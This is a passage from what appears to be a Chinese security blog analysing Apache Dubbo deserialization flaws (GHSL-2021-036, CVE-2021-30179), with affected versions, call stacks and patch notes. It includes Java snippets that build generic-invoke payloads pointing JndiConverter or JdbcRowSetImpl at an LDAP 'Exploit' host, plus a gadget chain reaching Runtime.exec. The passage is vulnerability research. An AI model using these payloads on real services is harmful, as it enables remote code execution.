class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.common.serialize.fst.FstObjectInput#readObject</span><br><span class="line">org.nustaq.serialization.FstObjectInput#readObject</span><br><span class="line">    ...</span><br><span class="line">        # 针对map的处理</span><br><span class="line">    org.nustaq.serialization.serializers.FSTMapSerializer#readObject</span><br></pre></td></tr></table></figure><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><ol><li><p>HotSwappableTargetSource 有何作用？</p></li><li><p>为何不用之前的rome HashMap#put -&gt; value.hashCode 的途径？</p></li></ol><p>也可以用，只是给出了另外的链，不过挺绕的</p><h4 id="5-2-2-Kryo"><a href="#5-2-2-Kryo" class="headerlink" title="5.2.2 Kryo"></a>5.2.2 Kryo</h4><p>应该类似，暂不分析</p><h3 id="5-3-补丁分析"><a href="#5-3-补丁分析" class="headerlink" title="5.3 补丁分析"></a>5.3 补丁分析</h3><p>可以参考j1ang 师傅的分析，简单来说是dubbo-common 2.7.3已经不内置fastjson了</p><p>这里复现遇到个不同的问题，dubbo-common 2.7.3中是fastjson1.2.68 了</p><p><img src="/images/pasted-472.png" alt="upload successful"></p><blockquote><p>师傅还提到在测试了dubbo 和dubbo-common 2.7.9 2.7.10 fastjson版本仍然是1.2.46，漏洞仍然可以触发。</p></blockquote><p>疑问</p><p>dubbo-common 怎么实现fastjson版本指定的，在其jar中的pom未找到版本</p><p>参考：<a href="https://repo1.maven.org/maven2/org/apache/dubbo/dubbo-common/2.7.3/dubbo-common-2.7.3.pom">https://repo1.maven.org/maven2/org/apache/dubbo/dubbo-common/2.7.3/dubbo-common-2.7.3.pom</a></p><h2 id="0x06-GHSL-2021-036"><a href="#0x06-GHSL-2021-036" class="headerlink" title="0x06 GHSL-2021-036"></a>0x06 GHSL-2021-036</h2><p>参考<a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/">https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/</a><br>Issue 3</p><h3 id="6-1-影响版本"><a href="#6-1-影响版本" class="headerlink" title="6.1 影响版本"></a>6.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3.0.0&lt;&#x3D;Dubbo&lt;&#x3D;3.0.5</span><br><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.15</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.12</span><br></pre></td></tr></table></figure><h3 id="6-2-漏洞分析"><a href="#6-2-漏洞分析" class="headerlink" title="6.2 漏洞分析"></a>6.2 漏洞分析</h3><p>GHSL-2021-036 暴露了出了太多的反序列化点，这个也可能是未分配CVE的原因。</p><h4 id="6-2-1-NOK-RPC"><a href="#6-2-1-NOK-RPC" class="headerlink" title="6.2.1 NOK RPC"></a>6.2.1 NOK RPC</h4><p>调用栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">toString:158, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:129, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">expect:3566, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readString:1883, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readUTF:89, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decodeBody:109, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:124, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:84, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:85, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:501, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:440, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:276, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:1410, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:919, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:714, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:650, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:576, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:493, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:989, SingleThreadEventExecutor$4 (io.netty.util.concurrent)</span><br><span class="line">run:74, ThreadExecutorMap$2 (io.netty.util.internal)</span><br><span class="line">run:30, FastThreadLocalRunnable (io.netty.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>核心的逻辑在于Hessian2#readString，如果发现tag字段类型非String，会调用expect进行Exception告警，其中</p><ol><li>尝试readObject</li><li>将obj 进行“+” 拼接<br>从而触发obj.toString，造成反序列化问题</li></ol><p><img src="/images/pasted-571.png" alt="upload successful"></p><blockquote><p>这个漏洞和后续的CVE-2021-43297岂止是异曲同工，完全是一模一样！！为什么没给CVE？</p></blockquote><h3 id="6-3-补丁分析"><a href="#6-3-补丁分析" class="headerlink" title="6.3 补丁分析"></a>6.3 补丁分析</h3><h2 id="0x07-CVE-2021-30179"><a href="#0x07-CVE-2021-30179" class="headerlink" title="0x07 CVE-2021-30179"></a>0x07 CVE-2021-30179</h2><h3 id="7-1-影响版本"><a href="#7-1-影响版本" class="headerlink" title="7.1 影响版本"></a>7.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.9</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.9</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><h3 id="7-2-漏洞分析"><a href="#7-2-漏洞分析" class="headerlink" title="7.2 漏洞分析"></a>7.2 漏洞分析</h3><p>dubbo 支持泛型调用 $invoke$invokeSync</p><p>参考：<a href="https://dubbo.apache.org/en/docs/v2.7/user/examples/generic-reference/">https://dubbo.apache.org/en/docs/v2.7/user/examples/generic-reference/</a></p><p>泛型的具体实现在GenericFilter，这里的Filter和Serverlet 的Filter 类似</p><p>在进入GenericFilter 之前，先要经过DecodeableRpcInvocation#decode 进行参数的预处理，针对</p><p>对$invoke$invokeSync，必须遵循以下的格式</p><ul><li>methodName: $invoke</li><li>methodDesc: </li><li>args: 范型的参数<ul><li>第一个参数  方法名</li><li>第二个参数  参数类型数组</li><li>第三个参数  参数对象（处理之后的，比如反序列化之后）</li></ul></li><li>attachment: 泛型调用的一些参数<ul><li>generic 决定如何从args[2](第三个参数)构造成真实的参数，有以下类型<ul><li>true</li><li>raw.return</li><li>nativejava</li><li>bean</li><li>protobuf-json</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4.methodName</span></span><br><span class="line">out.writeUTF(<span class="string">&quot;$invoke&quot;</span>);</span><br><span class="line"><span class="comment">// 5.methodDesc</span></span><br><span class="line">out.writeUTF(<span class="string">&quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;</span>);</span><br><span class="line"><span class="comment">// 6.paramsObject</span></span><br><span class="line"><span class="comment">// 泛型调用第一个参数  方法名</span></span><br><span class="line">out.writeUTF(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line"><span class="comment">// 泛型调用第二个参数  参数类型数组</span></span><br><span class="line">out.writeObject(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;java.lang.String&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// 泛型调用第三个参数  参数对象</span></span><br><span class="line">HashMap jndi = <span class="keyword">new</span> HashMap();</span><br><span class="line">jndi.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>);</span><br><span class="line">jndi.put(<span class="string">&quot;asText&quot;</span>, <span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br><span class="line">out.writeObject(<span class="keyword">new</span> Object[]&#123;jndi&#125;);</span><br><span class="line"><span class="comment">// attachment</span></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">&quot;generic&quot;</span>, <span class="string">&quot;raw.return&quot;</span>);</span><br><span class="line">out.writeObject(map);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-475.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!StringUtils.isEmpty(generic) &amp;&amp; !ProtocolUtils.isDefaultGenericSerialization(generic) &amp;&amp; !ProtocolUtils.isGenericReturnRawResult(generic)) &#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> (ProtocolUtils.isJavaGenericSerialization(generic))&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (ProtocolUtils.isBeanGenericSerialization(generic))&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (ProtocolUtils.isProtobufGenericSerialization(generic)) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    args = PojoUtils.realize(args, params, method.getGenericParameterTypes());</span><br></pre></td></tr></table></figure><p>第三个参数是个HashMap，HashMap中并不是直接存的所需的对象，而是根据attachment 中generic 的取值，有不同的逻辑。generic 有以下取值</p><ul><li>raw.return</li><li>bean</li><li>javanative</li><li>protobuf</li></ul><h4 id="7-2-1-raw-return"><a href="#7-2-1-raw-return" class="headerlink" title="7.2.1 raw.return"></a>7.2.1 raw.return</h4><p>raw.return 类型的generic 最终会交由PojoUtils.realize 进行处理</p><blockquote><p>POJO 实际上就是一个普通的Java对象，没有实现任何接口和继承，就是单纯单纯单纯，不能用序列化等方式还原，就用到了一些特殊的处理。</p></blockquote><p>PojoUtils 很重要，大致可以将它认为也是一个序列化/反序列化 简单处理Pojo的工具类。</p><p>前文中的PojoUtils.realize(args, params, method.getGenericParameterTypes())</p><p><img src="/images/pasted-477.png" alt="upload successful"></p><p><img src="/images/pasted-479.png" alt="upload successful"></p><p>会去实例化class里的类，并且会调用setattr，<strong>这里利用空间就很大了</strong></p><p>调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">toObjectImpl:35, JndiConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">toObject:86, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">setAsText:59, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">realize0:469, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">realize:209, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">realize:97, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">invoke:86, GenericFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)</span><br><span class="line">received:51, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>当然，用JdbcRowSetImpl也可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap jndi = <span class="keyword">new</span> HashMap();</span><br><span class="line">jndi.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line">jndi.put(<span class="string">&quot;dataSourceName&quot;</span>, <span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br><span class="line">jndi.put(<span class="string">&quot;autoCommit&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">out.writeObject(<span class="keyword">new</span> Object[]&#123;jndi&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>思考：这里的利用链应该很多</p></blockquote><h4 id="7-2-2-bean"><a href="#7-2-2-bean" class="headerlink" title="7.2.2 bean"></a>7.2.2 bean</h4><p>raw.return 类型的generic 最终会交由JavaBeanSerializeUtil.deserialize 进行处理<br><img src="/images/pasted-480.png" alt="upload successful"></p><p>首先args必须满足是JavaBeanDescriptor，可以简单理解为JavaBean的封装器</p><p><img src="/images/pasted-481.png" alt="upload successful"></p><p>与PojoUtils类似，JavaBeanSerializeUtil.deserialize 也通过获取setter 反射进行Bean 属性赋值</p><p><img src="/images/pasted-482.png" alt="upload successful"></p><p>调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeInternal:282, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)</span><br><span class="line">deserialize:215, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)</span><br><span class="line">deserialize:204, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)</span><br><span class="line">invoke:110, GenericFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)</span><br><span class="line">received:51, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="7-2-3-javanative"><a href="#7-2-3-javanative" class="headerlink" title="7.2.3 javanative"></a>7.2.3 javanative</h4><p><img src="/images/pasted-483.png" alt="upload successful"></p><p>其中 ((Serialization)ExtensionLoader.getExtensionLoader(Serialization.class).getExtension(“nativejava”)) 为NativeJavaSerialization</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readObject:334, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">readObject:50, NativeJavaObjectInput (org.apache.dubbo.common.serialize.nativejava)</span><br><span class="line">invoke:93, GenericFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)</span><br><span class="line">received:51, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h4 id="7-2-4-protobuf-json"><a href="#7-2-4-protobuf-json" class="headerlink" title="7.2.4 protobuf-json"></a>7.2.4 protobuf-json</h4><p>待补充</p><h3 id="7-3-EchoFilter"><a href="#7-3-EchoFilter" class="headerlink" title="7.3 EchoFilter"></a>7.3 EchoFilter</h3><p>@pwntester 提出了3条路径，具体可以看 <a href="https://securitylab.github.com/research/apache-dubbo/">【参考2】</a></p><ol><li>不存在的path 触发Exception，Exception message中有toString的隐式调用</li><li>控制_isCallBackServiceInvoke 进入DubboProtocol 的逻辑</li><li>TraceFilter#invoke</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">toString:105, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">toString:536, AbstractMap (java.util)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">toString:429, RpcInvocation (org.apache.dubbo.rpc)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">getInvoker:265, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeInvocationArgument:289, CallbackServiceCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:80, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:44, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><blockquote><p>Tips: wh1t3p1g 师傅们的CVE-2021-43297 source点不同，sink点都用到了toString 的隐式调用，异曲同工</p></blockquote><h3 id="7-4-其他"><a href="#7-4-其他" class="headerlink" title="7.4 其他"></a>7.4 其他</h3><h4 id="HashMap的插入无序性"><a href="#HashMap的插入无序性" class="headerlink" title="HashMap的插入无序性"></a>HashMap的插入无序性</h4><blockquote><p>map内保存内容的顺序不一定与放进去顺序一致，这叫无序。内容不变，取出来顺序一定不变，这叫有序。</p></blockquote><p><img src="/images/pasted-484.png" alt="upload successful"></p><p>对于多参数的，例如JdbcRowSetImpl，可利用的执行顺序是<br>setdataSourceName 再setAutoCommit</p><p>但是HashMap 输入是无序的，因此可能存在成功率的情况。</p><h3 id="7-5-补丁分析"><a href="#7-5-补丁分析" class="headerlink" title="7.5 补丁分析"></a>7.5 补丁分析</h3><p>2.7.10 版本终于引入了新的安全手段，黑名单</p><h4 id="7-5-1-安全策略-SerializeClassChecker-validClass"><a href="#7-5-1-安全策略-SerializeClassChecker-validClass" class="headerlink" title="7.5.1 安全策略 SerializeClassChecker#validClass"></a>7.5.1 安全策略 SerializeClassChecker#validClass</h4><p>包含黑名单在security/serialize.blockedlist 文件内，在org.apache.dubbo.common.utils。SerializeClassChecker#validateClass</p><p><img src="/images/pasted-485.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">validateClass</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    name = name.toLowerCase(Locale.ROOT);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.CACHE != <span class="keyword">this</span>.CLASS_ALLOW_LFU_CACHE.get(name)) &#123;</span><br><span class="line">    <span class="comment">// 是否在BLOCK 缓存内</span></span><br><span class="line">        <span class="comment">// 如果是，error 为抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.CACHE == <span class="keyword">this</span>.CLASS_BLOCK_LFU_CACHE.get(name)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.error(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Iterator var2 = <span 